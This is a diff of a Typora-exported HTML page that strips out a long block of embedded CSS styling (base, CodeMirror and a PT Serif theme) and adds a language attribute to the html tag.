@@ -1,949 +1,600 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'><style type='text/css'>html {overflow-x: initial !important;}</style>
-<style type='text/css'  id="style-base">:root { --bg-color: #ffffff; --text-color: #333333; --select-text-bg-color: #B5D6FC; --select-text-font-color: auto; --monospace: "Lucida Console",Consolas,"Courier",monospace; --title-bar-height: 20px; }
-.mac-os-11 { --title-bar-height: 28px; }
-html { font-size: 14px; background-color: var(--bg-color); color: var(--text-color); font-family: "Helvetica Neue", Helvetica, Arial, "Segoe UI Emoji", "SF Pro", sans-serif; -webkit-font-smoothing: antialiased; }
-h1, h2, h3, h4, h5 { white-space: pre-wrap; }
-body { margin: 0px; padding: 0px; height: auto; inset: 0px; font-size: 1rem; line-height: 1.42857; overflow-x: hidden; background: inherit; }
-iframe { margin: auto; }
-a.url { word-break: break-all; }
-a:active, a:hover { outline: 0px; }
-.in-text-selection, ::selection { text-shadow: none; background: var(--select-text-bg-color); color: var(--select-text-font-color); }
-#write { margin: 0px auto; height: auto; width: inherit; word-break: normal; overflow-wrap: break-word; position: relative; white-space: normal; overflow-x: visible; padding-top: 36px; }
-#write.first-line-indent p { text-indent: 2em; }
-#write.first-line-indent li p, #write.first-line-indent p *, #write.first-line-indent svg * { text-indent: 0px; }
-#write.first-line-indent li { margin-left: 2em; }
-.for-image #write { padding-left: 8px; padding-right: 8px; }
-body.typora-export { padding-left: 30px; padding-right: 30px; }
-.typora-export .footnote-line, .typora-export li, .typora-export p { white-space: pre-wrap; }
-.typora-export .task-list-item input { pointer-events: none; }
-@media screen and (max-width: 500px) {
-  body.typora-export { padding-left: 0px; padding-right: 0px; }
-  #write { padding-left: 20px; padding-right: 20px; }
-}
-#write li > figure:last-child { margin-bottom: 0.5rem; }
-#write ol, #write ul { position: relative; }
-img { max-width: 100%; vertical-align: middle; image-orientation: from-image; }
-button, input, select, textarea { color: inherit; font: inherit; }
-input[type="checkbox"], input[type="radio"] { line-height: normal; padding: 0px; }
-*, ::after, ::before { box-sizing: border-box; }
-#write h1, #write h2, #write h3, #write h4, #write h5, #write h6, #write p, #write pre { width: inherit; position: relative; }
-#write svg h1, #write svg h2, #write svg h3, #write svg h4, #write svg h5, #write svg h6, #write svg p { position: static; }
-.nodeLabel p { padding-right: 2px; padding-left: 2px; }
-.typora-export .nodeLabel p { padding-right: 0px; padding-left: 0px; }
-foreignobject { overflow: visible; }
-p { line-height: inherit; }
-h1, h2, h3, h4, h5, h6 { break-after: avoid-page; break-inside: avoid; orphans: 4; }
-p { orphans: 4; }
-li p { orphans: 1; }
-h1 { font-size: 2rem; }
-h2 { font-size: 1.8rem; }
-h3 { font-size: 1.6rem; }
-h4 { font-size: 1.4rem; }
-h5 { font-size: 1.2rem; }
-h6 { font-size: 1rem; }
-.md-math-block, .md-rawblock, h1, h2, h3, h4, h5, h6, p { margin-top: 1rem; margin-bottom: 1rem; }
-.hidden { display: none; }
-.md-blockmeta { color: rgb(204, 204, 204); font-weight: 700; font-style: italic; }
-a { cursor: pointer; }
-sup.md-footnote { padding: 2px 4px; background-color: rgba(238, 238, 238, 0.7); color: rgb(85, 85, 85); border-radius: 4px; cursor: pointer; }
-sup.md-footnote a, sup.md-footnote a:hover { color: inherit; text-transform: inherit; text-decoration: inherit; }
-#write input[type="checkbox"] { cursor: pointer; width: inherit; height: inherit; }
-figure { overflow-x: auto; margin: 1.2em 0px; max-width: calc(100% + 16px); padding: 0px; }
-figure > table { margin: 0px; }
-thead, tr { break-inside: avoid; break-after: auto; }
-thead { display: table-header-group; }
-table { border-collapse: collapse; border-spacing: 0px; width: 100%; overflow: auto; break-inside: auto; text-align: left; }
-table.md-table td { min-width: 32px; }
-.CodeMirror-gutters { border-right: 0px; background-color: inherit; }
-.CodeMirror-linenumber { user-select: none; }
-.CodeMirror { text-align: left; }
-.CodeMirror-placeholder { opacity: 0.3; }
-.CodeMirror pre { padding: 0px 4px; }
-.CodeMirror-lines { padding: 0px; }
-div.hr:focus { cursor: none; }
-#write pre { white-space: pre-wrap; }
-#write.fences-no-line-wrapping pre { white-space: pre; }
-#write pre.ty-contain-cm { white-space: normal; }
-.CodeMirror-gutters { margin-right: 4px; }
-.md-fences { font-size: 0.9rem; display: block; break-inside: avoid; text-align: left; overflow: visible; white-space: pre; background: inherit; position: relative !important; }
-.md-fences-adv-panel { width: 100%; margin-top: 10px; text-align: center; padding-top: 0px; padding-bottom: 8px; overflow-x: auto; }
-#write .md-fences.mock-cm { white-space: pre-wrap; }
-.md-fences.md-fences-with-lineno { padding-left: 0px; }
-#write.fences-no-line-wrapping .md-fences.mock-cm { white-space: pre; overflow-x: auto; }
-.md-fences.mock-cm.md-fences-with-lineno { padding-left: 8px; }
-.CodeMirror-line, twitterwidget { break-inside: avoid; }
-svg { break-inside: avoid; }
-.footnotes { opacity: 0.8; font-size: 0.9rem; margin-top: 1em; margin-bottom: 1em; }
-.footnotes + .footnotes { margin-top: 0px; }
-.md-reset { margin: 0px; padding: 0px; border: 0px; outline: 0px; vertical-align: top; background: 0px 0px; text-decoration: none; text-shadow: none; float: none; position: static; width: auto; height: auto; white-space: nowrap; cursor: inherit; -webkit-tap-highlight-color: transparent; line-height: normal; font-weight: 400; text-align: left; box-sizing: content-box; direction: ltr; }
-li div { padding-top: 0px; }
-blockquote { margin: 1rem 0px; }
-li .mathjax-block, li p { margin: 0.5rem 0px; }
-li blockquote { margin: 1rem 0px; }
-li { margin: 0px; position: relative; }
-blockquote > :last-child { margin-bottom: 0px; }
-blockquote > :first-child, li > :first-child { margin-top: 0px; }
-.footnotes-area { color: rgb(136, 136, 136); margin-top: 0.714rem; padding-bottom: 0.143rem; white-space: normal; }
-#write .footnote-line { white-space: pre-wrap; }
-@media print {
-  body, html { border: 1px solid transparent; height: 99%; break-after: avoid; break-before: avoid; font-variant-ligatures: no-common-ligatures; }
-  #write { margin-top: 0px; border-color: transparent !important; padding-top: 0px !important; padding-bottom: 0px !important; }
-  .typora-export * { -webkit-print-color-adjust: exact; }
-  .typora-export #write { break-after: avoid; }
-  .typora-export #write::after { height: 0px; }
-  .is-mac table { break-inside: avoid; }
-  #write > p:nth-child(1) { margin-top: 0px; }
-  .typora-export-show-outline .typora-export-sidebar { display: none; }
-  figure { overflow-x: visible; }
-}
-.footnote-line { margin-top: 0.714em; font-size: 0.7em; }
-a img, img a { cursor: pointer; }
-pre.md-meta-block { font-size: 0.8rem; min-height: 0.8rem; white-space: pre-wrap; background: rgb(204, 204, 204); display: block; overflow-x: hidden; }
-p > .md-image:only-child:not(.md-img-error) img, p > img:only-child { display: block; margin: auto; }
-#write.first-line-indent p > .md-image:only-child:not(.md-img-error) img { left: -2em; position: relative; }
-p > .md-image:only-child { display: inline-block; width: 100%; }
-#write .MathJax_Display { margin: 0.8em 0px 0px; }
-.md-math-block { width: 100%; }
-.md-math-block:not(:empty)::after { display: none; }
-.MathJax_ref { fill: currentcolor; }
-[contenteditable="true"]:active, [contenteditable="true"]:focus, [contenteditable="false"]:active, [contenteditable="false"]:focus { outline: 0px; box-shadow: none; }
-.md-task-list-item { position: relative; list-style-type: none; }
-.task-list-item.md-task-list-item { padding-left: 0px; }
-.md-task-list-item > input { position: absolute; top: 0px; left: 0px; margin-left: -1.2em; margin-top: calc(1em - 10px); border: none; }
-.math { font-size: 1rem; }
-.md-toc { min-height: 3.58rem; position: relative; font-size: 0.9rem; border-radius: 10px; }
-.md-toc-content { position: relative; margin-left: 0px; }
-.md-toc-content::after, .md-toc::after { display: none; }
-.md-toc-item { display: block; color: rgb(65, 131, 196); }
-.md-toc-item a { text-decoration: none; }
-.md-toc-inner:hover { text-decoration: underline; }
-.md-toc-inner { display: inline-block; cursor: pointer; }
-.md-toc-h1 .md-toc-inner { margin-left: 0px; font-weight: 700; }
-.md-toc-h2 .md-toc-inner { margin-left: 2em; }
-.md-toc-h3 .md-toc-inner { margin-left: 4em; }
-.md-toc-h4 .md-toc-inner { margin-left: 6em; }
-.md-toc-h5 .md-toc-inner { margin-left: 8em; }
-.md-toc-h6 .md-toc-inner { margin-left: 10em; }
-@media screen and (max-width: 48em) {
-  .md-toc-h3 .md-toc-inner { margin-left: 3.5em; }
-  .md-toc-h4 .md-toc-inner { margin-left: 5em; }
-  .md-toc-h5 .md-toc-inner { margin-left: 6.5em; }
-  .md-toc-h6 .md-toc-inner { margin-left: 8em; }
-}
-a.md-toc-inner { font-size: inherit; font-style: inherit; font-weight: inherit; line-height: inherit; }
-.footnote-line a:not(.reversefootnote) { color: inherit; }
-.reversefootnote { font-family: ui-monospace, sans-serif; }
-.md-attr { display: none; }
-.md-fn-count::after { content: "."; }
-code, pre, samp, tt { font-family: var(--monospace); }
-kbd { margin: 0px 0.1em; padding: 0.1em 0.6em; font-size: 0.8em; color: rgb(36, 39, 41); background: rgb(255, 255, 255); border: 1px solid rgb(173, 179, 185); border-radius: 3px; box-shadow: rgba(12, 13, 14, 0.2) 0px 1px 0px, rgb(255, 255, 255) 0px 0px 0px 2px inset; white-space: nowrap; vertical-align: middle; }
-.md-comment { color: rgb(162, 127, 3); opacity: 0.6; font-family: var(--monospace); }
-code { text-align: left; vertical-align: initial; }
-a.md-print-anchor { white-space: pre !important; border-width: initial !important; border-style: none !important; border-color: initial !important; display: inline-block !important; position: absolute !important; width: 1px !important; right: 0px !important; outline: 0px !important; background: 0px 0px !important; text-decoration: initial !important; text-shadow: initial !important; }
-.os-windows.monocolor-emoji .md-emoji { font-family: "Segoe UI Symbol", sans-serif; }
-.md-diagram-panel > svg { max-width: 100%; }
-[lang="flow"] svg, [lang="mermaid"] svg { max-width: 100%; height: auto; }
-[lang="mermaid"] .node text { font-size: 1rem; }
-table tr th { border-bottom: 0px; }
-video { max-width: 100%; display: block; margin: 0px auto; }
-iframe { max-width: 100%; width: 100%; border: none; }
-.highlight td, .highlight tr { border: 0px; }
-mark { background: rgb(255, 255, 0); color: rgb(0, 0, 0); }
-.md-html-inline .md-plain, .md-html-inline strong, mark .md-inline-math, mark strong { color: inherit; }
-.md-expand mark .md-meta { opacity: 0.3 !important; }
-mark .md-meta { color: rgb(0, 0, 0); }
-@media print {
-  .typora-export h1, .typora-export h2, .typora-export h3, .typora-export h4, .typora-export h5, .typora-export h6 { break-inside: avoid; }
-}
-.md-diagram-panel .messageText { stroke: none !important; }
-.md-diagram-panel .start-state { fill: var(--node-fill); }
-.md-diagram-panel .edgeLabel rect { opacity: 1 !important; }
-.md-fences.md-fences-math { font-size: 1em; }
-.md-fences-advanced:not(.md-focus) { padding: 0px; white-space: nowrap; border: 0px; }
-.md-fences-advanced:not(.md-focus) { background: inherit; }
-.mermaid-svg { margin: auto; }
-.typora-export-show-outline .typora-export-content { max-width: 1440px; margin: auto; display: flex; flex-direction: row; }
-.typora-export-sidebar { width: 300px; font-size: 0.8rem; margin-top: 80px; margin-right: 18px; }
-.typora-export-show-outline #write { --webkit-flex: 2; flex: 2 1 0%; }
-.typora-export-sidebar .outline-content { position: fixed; top: 0px; max-height: 100%; overflow: hidden auto; padding-bottom: 30px; padding-top: 60px; width: 300px; }
-@media screen and (max-width: 1024px) {
-  .typora-export-sidebar, .typora-export-sidebar .outline-content { width: 240px; }
-}
-@media screen and (max-width: 800px) {
-  .typora-export-sidebar { display: none; }
-}
-.outline-content li, .outline-content ul { margin-left: 0px; margin-right: 0px; padding-left: 0px; padding-right: 0px; list-style: none; overflow-wrap: anywhere; }
-.outline-content ul { margin-top: 0px; margin-bottom: 0px; }
-.outline-content strong { font-weight: 400; }
-.outline-expander { width: 1rem; height: 1.42857rem; position: relative; display: table-cell; vertical-align: middle; cursor: pointer; padding-left: 4px; }
-.outline-expander::before { content: ""; position: relative; font-family: Ionicons; display: inline-block; font-size: 8px; vertical-align: middle; }
-.outline-item { padding-top: 3px; padding-bottom: 3px; cursor: pointer; }
-.outline-expander:hover::before { content: ""; }
-.outline-h1 > .outline-item { padding-left: 0px; }
-.outline-h2 > .outline-item { padding-left: 1em; }
-.outline-h3 > .outline-item { padding-left: 2em; }
-.outline-h4 > .outline-item { padding-left: 3em; }
-.outline-h5 > .outline-item { padding-left: 4em; }
-.outline-h6 > .outline-item { padding-left: 5em; }
-.outline-label { cursor: pointer; display: table-cell; vertical-align: middle; text-decoration: none; color: inherit; }
-.outline-label:hover { text-decoration: underline; }
-.outline-item:hover { border-color: rgb(245, 245, 245); background-color: var(--item-hover-bg-color); }
-.outline-item:hover { margin-left: -28px; margin-right: -28px; border-left: 28px solid transparent; border-right: 28px solid transparent; }
-.outline-item-single .outline-expander::before, .outline-item-single .outline-expander:hover::before { display: none; }
-.outline-item-open > .outline-item > .outline-expander::before { content: ""; }
-.outline-children { display: none; }
-.info-panel-tab-wrapper { display: none; }
-.outline-item-open > .outline-children { display: block; }
-.typora-export .outline-item { padding-top: 1px; padding-bottom: 1px; }
-.typora-export .outline-item:hover { margin-right: -8px; border-right: 8px solid transparent; }
-.typora-export .outline-expander::before { content: "+"; font-family: inherit; top: -1px; }
-.typora-export .outline-expander:hover::before, .typora-export .outline-item-open > .outline-item > .outline-expander::before { content: "−"; }
-.typora-export-collapse-outline .outline-children { display: none; }
-.typora-export-collapse-outline .outline-item-open > .outline-children, .typora-export-no-collapse-outline .outline-children { display: block; }
-.typora-export-no-collapse-outline .outline-expander::before { content: "" !important; }
-.typora-export-show-outline .outline-item-active > .outline-item .outline-label { font-weight: 700; }
-.md-inline-math-container mjx-container { zoom: 0.95; }
-mjx-container { break-inside: avoid; }
-.md-alert.md-alert-note { border-left-color: rgb(9, 105, 218); }
-.md-alert.md-alert-important { border-left-color: rgb(130, 80, 223); }
-.md-alert.md-alert-warning { border-left-color: rgb(154, 103, 0); }
-.md-alert.md-alert-tip { border-left-color: rgb(31, 136, 61); }
-.md-alert.md-alert-caution { border-left-color: rgb(207, 34, 46); }
-.md-alert { padding: 0px 1em; margin-bottom: 16px; color: inherit; border-left: 0.25em solid rgb(0, 0, 0); }
-.md-alert-text-note { color: rgb(9, 105, 218); }
-.md-alert-text-important { color: rgb(130, 80, 223); }
-.md-alert-text-warning { color: rgb(154, 103, 0); }
-.md-alert-text-tip { color: rgb(31, 136, 61); }
-.md-alert-text-caution { color: rgb(207, 34, 46); }
-.md-alert-text { font-size: 0.9rem; font-weight: 700; }
-.md-alert-text svg { fill: currentcolor; position: relative; top: 0.125em; margin-right: 1ch; overflow: visible; }
-.md-alert-text-container::after { content: attr(data-text); text-transform: capitalize; pointer-events: none; margin-right: 1ch; }
-
-</style>
-<style type='text/css'  id="style-codemirror">.CodeMirror { height: auto; }
-.CodeMirror.cm-s-inner { background: inherit; }
-.CodeMirror-scroll { overflow: auto hidden; z-index: 3; }
-.CodeMirror-gutter-filler, .CodeMirror-scrollbar-filler { background-color: rgb(255, 255, 255); }
-.CodeMirror-gutters { border-right: 1px solid rgb(221, 221, 221); background: inherit; white-space: nowrap; }
-.CodeMirror-linenumber { padding: 0px 3px 0px 5px; text-align: right; color: rgb(153, 153, 153); }
-.cm-s-inner .cm-keyword { color: rgb(119, 0, 136); }
-.cm-s-inner .cm-atom, .cm-s-inner.cm-atom { color: rgb(34, 17, 153); }
-.cm-s-inner .cm-number { color: rgb(17, 102, 68); }
-.cm-s-inner .cm-def { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-variable { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-variable-2 { color: rgb(0, 85, 170); }
-.cm-s-inner .cm-variable-3 { color: rgb(0, 136, 85); }
-.cm-s-inner .cm-string { color: rgb(170, 17, 17); }
-.cm-s-inner .cm-property { color: rgb(0, 0, 0); }
-.cm-s-inner .cm-operator { color: rgb(152, 26, 26); }
-.cm-s-inner .cm-comment, .cm-s-inner.cm-comment { color: rgb(170, 85, 0); }
-.cm-s-inner .cm-string-2 { color: rgb(255, 85, 0); }
-.cm-s-inner .cm-meta { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-qualifier { color: rgb(85, 85, 85); }
-.cm-s-inner .cm-builtin { color: rgb(51, 0, 170); }
-.cm-s-inner .cm-bracket { color: rgb(153, 153, 119); }
-.cm-s-inner .cm-tag { color: rgb(17, 119, 0); }
-.cm-s-inner .cm-attribute { color: rgb(0, 0, 204); }
-.cm-s-inner .cm-header, .cm-s-inner.cm-header { color: rgb(0, 0, 255); }
-.cm-s-inner .cm-quote, .cm-s-inner.cm-quote { color: rgb(0, 153, 0); }
-.cm-s-inner .cm-hr, .cm-s-inner.cm-hr { color: rgb(153, 153, 153); }
-.cm-s-inner .cm-link, .cm-s-inner.cm-link { color: rgb(0, 0, 204); }
-.cm-negative { color: rgb(221, 68, 68); }
-.cm-positive { color: rgb(34, 153, 34); }
-.cm-header, .cm-strong { font-weight: 700; }
-.cm-del { text-decoration: line-through; }
-.cm-em { font-style: italic; }
-.cm-link { text-decoration: underline; }
-.cm-error { color: red; }
-.cm-invalidchar { color: red; }
-.cm-constant { color: rgb(38, 139, 210); }
-.cm-defined { color: rgb(181, 137, 0); }
-div.CodeMirror span.CodeMirror-matchingbracket { color: rgb(0, 255, 0); }
-div.CodeMirror span.CodeMirror-nonmatchingbracket { color: rgb(255, 34, 34); }
-.cm-s-inner .CodeMirror-activeline-background { background: inherit; }
-.CodeMirror { position: relative; overflow: hidden; }
-.CodeMirror-scroll { height: 100%; outline: 0px; position: relative; box-sizing: content-box; background: inherit; }
-.CodeMirror-sizer { position: relative; }
-.CodeMirror-gutter-filler, .CodeMirror-hscrollbar, .CodeMirror-scrollbar-filler, .CodeMirror-vscrollbar { position: absolute; z-index: 6; display: none; outline: 0px; }
-.CodeMirror-vscrollbar { right: 0px; top: 0px; overflow: hidden; }
-.CodeMirror-hscrollbar { bottom: 0px; left: 0px; overflow: auto hidden; }
-.CodeMirror-scrollbar-filler { right: 0px; bottom: 0px; }
-.CodeMirror-gutter-filler { left: 0px; bottom: 0px; }
-.CodeMirror-gutters { position: absolute; left: 0px; top: 0px; padding-bottom: 10px; z-index: 3; overflow-y: hidden; }
-.CodeMirror-gutter { white-space: normal; height: 100%; box-sizing: content-box; padding-bottom: 30px; margin-bottom: -32px; display: inline-block; }
-.CodeMirror-gutter-wrapper { position: absolute; z-index: 4; background: 0px 0px !important; border: none !important; }
-.CodeMirror-gutter-background { position: absolute; top: 0px; bottom: 0px; z-index: 4; }
-.CodeMirror-gutter-elt { position: absolute; cursor: default; z-index: 4; }
-.CodeMirror-lines { cursor: text; }
-.CodeMirror pre { border-radius: 0px; border-width: 0px; background: 0px 0px; font-family: inherit; font-size: inherit; margin: 0px; white-space: pre; overflow-wrap: normal; color: inherit; z-index: 2; position: relative; overflow: visible; }
-.CodeMirror-wrap pre { overflow-wrap: break-word; white-space: pre-wrap; word-break: normal; }
-.CodeMirror-code pre { border-right: 30px solid transparent; width: fit-content; }
-.CodeMirror-wrap .CodeMirror-code pre { border-right: none; width: auto; }
-.CodeMirror-linebackground { position: absolute; inset: 0px; z-index: 0; }
-.CodeMirror-linewidget { position: relative; z-index: 2; overflow: auto; }
-.CodeMirror-wrap .CodeMirror-scroll { overflow-x: hidden; }
-.CodeMirror-measure { position: absolute; width: 100%; height: 0px; overflow: hidden; visibility: hidden; }
-.CodeMirror-measure pre { position: static; }
-.CodeMirror div.CodeMirror-cursor { position: absolute; visibility: hidden; border-right: none; width: 0px; }
-.CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-.CodeMirror-focused div.CodeMirror-cursor { visibility: inherit; }
-.cm-searching { background: rgba(255, 255, 0, 0.4); }
-span.cm-underlined { text-decoration: underline; }
-span.cm-strikethrough { text-decoration: line-through; }
-.cm-tw-syntaxerror { color: rgb(255, 255, 255); background-color: rgb(153, 0, 0); }
-.cm-tw-deleted { text-decoration: line-through; }
-.cm-tw-header5 { font-weight: 700; }
-.cm-tw-listitem:first-child { padding-left: 10px; }
-.cm-tw-box { border-style: solid; border-right-width: 1px; border-bottom-width: 1px; border-left-width: 1px; border-color: inherit; border-top-width: 0px !important; }
-.cm-tw-underline { text-decoration: underline; }
-@media print {
-  .CodeMirror div.CodeMirror-cursor { visibility: hidden; }
-}
-
-</style>
-<link rel='stylesheet' href='https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&amp;subset=latin,cyrillic-ext,cyrillic,latin-ext' type='text/css' />
-<style type='text/css'  id="style-theme_css">/* meyer reset -- http://meyerweb.com/eric/tools/css/reset/ , v2.0 | 20110126 | License: none (public domain) */
-
-@include-when-export url(https://fonts.loli.net/css?family=PT+Serif:400,400italic,700,700italic&subset=latin,cyrillic-ext,cyrillic,latin-ext);
-
-/* =========== */
-
-/* pt-serif-regular - latin */
-/* pt-serif-italic - latin */
-/* pt-serif-700 - latin */
-/* pt-serif-700italic - latin */
-:root {
-  --active-file-bg-color: #dadada;
-  --active-file-bg-color: rgba(32, 43, 51, 0.63);
-  --active-file-text-color: white;
-  --bg-color: #f3f2ee;
-  --text-color: #1f0909;
-  --control-text-color: #444;
-  --rawblock-edit-panel-bd: #e5e5e5;
-
-  --select-text-bg-color: rgba(32, 43, 51, 0.63);
-  --select-text-font-color: white;
-}
-
-pre {
-  --select-text-bg-color: #36284e;
-  --select-text-font-color: #fff;
-}
-
-html {
-  font-size: 16px;
-  -webkit-font-smoothing: antialiased;
-}
-
-html,
-body {
-  background-color: #f3f2ee;
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-  line-height: 1.5em;
-}
-
-/*#write {
-	overflow-x: auto;
-    max-width: initial;
-	padding-left: calc(50% - 17em);
-    padding-right: calc(50% - 17em);
-}
-
-@media (max-width: 36em) {
- 	#write {
- 		padding-left: 1em;
-    	padding-right: 1em;
- 	}
-}*/
-
-/* #write {
-  max-width: 40em;
-} */
-
-/* @media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 914px;
-  }
-} */
-
-/* 강제 적용 버전 */
-#write {
-  max-width: 900px !important; /* 숫자를 더 키워보세요 */
-  width: 90% !important;
-}
-
-@media only screen and (min-width: 1400px) {
-  #write {
-    max-width: 1400px !important;
-  }
-}
-
-ol li {
-  list-style-type: decimal;
-  list-style-position: outside;
-}
-ul li {
-  list-style-type: disc;
-  list-style-position: outside;
-}
-
-ol,
-ul {
-  list-style: none;
-}
-
-blockquote,
-q {
-  quotes: none;
-}
-blockquote:before,
-blockquote:after,
-q:before,
-q:after {
-  content: "";
-  content: none;
-}
-table {
-  border-collapse: collapse;
-  border-spacing: 0;
-}
-/* styles */
-
-/* ====== */
-
-/* headings */
-
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  font-weight: bold;
-}
-h1 {
-  font-size: 1.875em;
-  /*30 / 16*/
-  line-height: 1.6em;
-  /* 48 / 30*/
-  margin-top: 2em;
-}
-h2,
-h3 {
-  font-size: 1.3125em;
-  /*21 / 16*/
-  line-height: 1.15;
-  /*24 / 21*/
-  margin-top: 2.285714em;
-  /*48 / 21*/
-  margin-bottom: 1.15em;
-  /*24 / 21*/
-}
-h3 {
-  font-weight: normal;
-}
-h4 {
-  font-size: 1.125em;
-  /*18 / 16*/
-  margin-top: 2.67em;
-  /*48 / 18*/
-}
-h5,
-h6 {
-  font-size: 1em;
-  /*16*/
-}
-h1 {
-  border-bottom: 1px solid;
-  margin-bottom: 1.875em;
-  padding-bottom: 0.8125em;
-}
-/* links */
-
-a {
-  text-decoration: none;
-  color: #065588;
-}
-a:hover,
-a:active {
-  text-decoration: underline;
-}
-/* block spacing */
-
-p,
-blockquote,
-.md-fences {
-  margin-bottom: 1.5em;
-}
-h1,
-h2,
-h3,
-h4,
-h5,
-h6 {
-  margin-bottom: 1.5em;
-}
-/* blockquote */
-
-blockquote {
-  font-style: italic;
-  border-left: 5px solid;
-  margin-left: 2em;
-  padding-left: 1em;
-}
-/* lists */
-
-ul,
-ol {
-  margin: 0 0 1.5em 1.5em;
-}
-/* tables */
-.md-meta,
-.md-before,
-.md-after {
-  color: #999;
-}
-
-table {
-  margin-bottom: 1.5em;
-  /*24 / 16*/
-  font-size: 1em;
-  /* width: 100%; */
-}
-thead th,
-tfoot th {
-  padding: 0.25em 0.25em 0.25em 0.4em;
-  text-transform: uppercase;
-}
-th {
-  text-align: left;
-}
-td {
-  vertical-align: top;
-  padding: 0.25em 0.25em 0.25em 0.4em;
-}
-
-code,
-.md-fences {
-  background-color: #dadada;
-}
-
-code {
-  padding-left: 2px;
-  padding-right: 2px;
-}
-
-.md-fences {
-  margin-left: 2em;
-  margin-bottom: 3em;
-  padding-left: 1ch;
-  padding-right: 1ch;
-  font-size: 0.8em;
-  margin-left: 0 !important;
-  width: 90% !important; /* 100%에서 95%로 살짝 줄임 */
-  max-width: 90% !important; /* 최대치 고정 */
-}
-
-pre,
-code,
-tt {
-  font-size: 0.875em;
-  line-height: 1.714285em;
-}
-/* some fixes */
-
-h1 {
-  line-height: 1.3em;
-  font-weight: normal;
-  margin-bottom: 0.5em;
-}
-
-p + ul,
-p + ol {
-  margin-top: 0.5em;
-}
-
-h3 + ul,
-h4 + ul,
-h5 + ul,
-h6 + ul,
-h3 + ol,
-h4 + ol,
-h5 + ol,
-h6 + ol {
-  margin-top: 0.5em;
-}
-
-li > ul,
-li > ol {
-  margin-top: inherit;
-  margin-bottom: 0;
-}
-
-li ol > li {
-  list-style-type: lower-alpha;
-}
-
-li li ol > li {
-  list-style-type: lower-roman;
-}
-
-h2,
-h3 {
-  margin-bottom: 0.75em;
-}
-hr {
-  border-top: none;
-  border-right: none;
-  border-bottom: 1px solid;
-  border-left: none;
-}
-h1 {
-  border-color: #c5c5c5;
-}
-blockquote {
-  border-color: #bababa;
-  color: #656565;
-}
-
-blockquote ul,
-blockquote ol {
-  margin-left: 0;
-}
-
-.ty-table-edit {
-  background-color: transparent;
-}
-thead {
-  background-color: #dadada;
-}
-tr:nth-child(even) {
-  background: #e8e7e7;
-}
-hr {
-  border-color: #c5c5c5;
-}
-.task-list {
-  padding-left: 1rem;
-}
-
-.md-task-list-item {
-  padding-left: 1.5rem;
-  list-style-type: none;
-}
-
-.md-task-list-item > input:before {
-  content: "\221A";
-  display: inline-block;
-  width: 1.25rem;
-  height: 1.6rem;
-  vertical-align: middle;
-  text-align: center;
-  color: #ddd;
-  background-color: #f3f2ee;
-}
-
-.md-task-list-item > input:checked:before,
-.md-task-list-item > input[checked]:before {
-  color: inherit;
-}
-
-#write pre.md-meta-block {
-  min-height: 1.875rem;
-  color: #555;
-  border: 0px;
-  background: transparent;
-  margin-top: -4px;
-  margin-left: 1em;
-  margin-top: 1em;
-}
-
-.md-image > .md-meta {
-  color: #9b5146;
-}
-
-.md-image > .md-meta {
-  font-family:
-    Menlo, "Ubuntu Mono", Consolas, "Courier New", "Microsoft Yahei",
-    "Hiragino Sans GB", "WenQuanYi Micro Hei", serif;
-}
-
-#write > h3.md-focus:before {
-  left: -1.5rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h4.md-focus:before {
-  left: -1.5rem;
-  top: 0.25rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h5.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-#write > h6.md-focus:before {
-  left: -1.5rem;
-  top: 0.3125rem;
-  color: #999;
-  border-color: #999;
-}
-
-.md-toc:focus .md-toc-content {
-  margin-top: 19px;
-}
-
-.md-toc-content:empty:before {
-  color: #065588;
-}
-.md-toc-item {
-  color: #065588;
-}
-#write div.md-toc-tooltip {
-  background-color: #f3f2ee;
-}
-
-#typora-sidebar {
-  background-color: #f3f2ee;
-  -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-}
-
-.pin-outline #typora-sidebar {
-  background: inherit;
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-.pin-outline #typora-sidebar:hover .outline-title-wrapper {
-  border-left: 1px dashed;
-}
-
-.outline-item:hover {
-  background-color: #dadada;
-  border-left: 28px solid #dadada;
-  border-right: 18px solid #dadada;
-}
-
-.typora-node .outline-item:hover {
-  border-right: 28px solid #dadada;
-}
-
-.outline-expander:before {
-  content: "\f0da";
-  font-family: FontAwesome;
-  font-size: 14px;
-  top: 1px;
-}
-
-.outline-expander:hover:before,
-.outline-item-open > .outline-item > .outline-expander:before {
-  content: "\f0d7";
-}
-
-.modal-content {
-  background-color: #f3f2ee;
-}
-
-.auto-suggest-container ul li {
-  list-style-type: none;
-}
-
-/** UI for electron */
-
-.megamenu-menu,
-#top-titlebar,
-#top-titlebar *,
-.megamenu-content {
-  background: #f3f2ee;
-  color: #1f0909;
-}
-
-.megamenu-menu-header {
-  border-bottom: 1px dashed #202b33;
-}
-
-.megamenu-menu {
-  box-shadow: none;
-  border-right: 1px dashed;
-}
-
-header,
-.context-menu,
-.megamenu-content,
-footer {
-  font-family: "PT Serif", "Times New Roman", Times, serif;
-  color: #1f0909;
-}
-
-#megamenu-back-btn {
-  color: #1f0909;
-  border-color: #1f0909;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title:before {
-  color: #1f0909;
-}
-
-.megamenu-menu-list li a:hover,
-.megamenu-menu-list li a.active {
-  color: inherit;
-  background-color: #e8e7df;
-}
-
-.long-btn:hover {
-  background-color: #e8e7df;
-}
-
-#recent-file-panel tbody tr:nth-child(2n-1) {
-  background-color: transparent !important;
-}
-
-.megamenu-menu-panel tbody tr:hover td:nth-child(2) {
-  color: inherit;
-}
-
-.megamenu-menu-panel .btn {
-  background-color: #d2d1d1;
-}
-
-.btn-default {
-  background-color: transparent;
-}
-
-.typora-sourceview-on #toggle-sourceview-btn,
-.ty-show-word-count #footer-word-count {
-  background: #c7c5c5;
-}
-
-#typora-quick-open {
